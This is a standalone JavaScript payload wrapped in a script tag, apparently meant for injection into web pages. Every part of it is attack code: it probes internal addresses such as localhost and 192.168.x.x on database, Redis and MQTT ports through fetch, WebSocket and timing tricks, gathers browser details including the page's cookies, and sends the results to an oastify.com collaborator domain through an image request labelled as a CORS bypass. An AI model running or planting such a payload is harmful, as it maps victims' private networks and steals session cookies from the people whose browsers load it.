<script>(async () => {
    const oastDomain = 'od547dymv9h693do4u2sfx1nze55t2hr.oastify.com';

    // Define IPs and ports to scan
    const ips = ['127.0.0.1', '0.0.0.0', '192.168.0.1', '192.168.1.1', '10.0.0.1', 'localhost'];
    const ports = [80, 8080, 443, 3306, 6379, 1883, 8086, 6066];  // Common HTTP and non-HTTP ports

    const results = [];
    const wsResults = [];
    const timingResults = [];

    // Function to perform HTTP Fetch Requests
    async function scanHttp(ip, port) {
        const url = `http://${ip}:${port}`;
        try {
            const response = await fetch(url, { method: 'GET', credentials: 'omit' });
            const result = response.ok ? `HTTP Open: ${url}` : `HTTP Closed: ${url}`;
            results.push(result);
        } catch (error) {
            results.push(`HTTP Failed: ${url} - ${error}`);
        }
    }

    // Function to perform WebSocket Requests
    async function scanWebSocket(ip, port) {
        const url = `ws://${ip}:${port}`;
        try {
            const ws = new WebSocket(url);
            ws.onerror = () => wsResults.push(`WS Closed: ${url}`);
            ws.onopen = () => {
                wsResults.push(`WS Open: ${url}`);
                ws.close();
            };
            await new Promise(res => setTimeout(res, 500));
        } catch (e) {
            wsResults.push(`WS Error: ${url}`);
        }
    }

    // Timing Attack for Service Detection
    async function timingAttack(ip, port) {
        const url = `http://${ip}:${port}`;
        const start = performance.now();
        try { await fetch(url); } catch (e) { }
        const duration = performance.now() - start;
        timingResults.push(`Timing ${url}: ${duration}ms`);
    }

    // Browser and System Info Collection
    const systemInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookies: document.cookie || 'No cookies',
        screen: `${screen.width}x${screen.height}`,
        cores: navigator.hardwareConcurrency || 'Unknown',
    };

    // Execute HTTP, WebSocket Scans, and Timing Attacks
    for (const ip of ips) {
        for (const port of ports) {
            await scanHttp(ip, port);
            await scanWebSocket(ip, port);
            await timingAttack(ip, port);
        }
    }

    // Prepare Data for Exfiltration
    const payload = encodeURIComponent(JSON.stringify({
        timestamp: new Date().toISOString(),
        httpResults: results,
        wsResults: wsResults,
        timingResults: timingResults,
        systemInfo: systemInfo,
    }));

    // Exfiltrate Data via Image Request (Bypass CORS)
    const img = new Image();
    img.src = `https://${oastDomain}/?data=${payload}`;
    console.log('Data exfiltrated to OAST endpoint.');
})();</script>
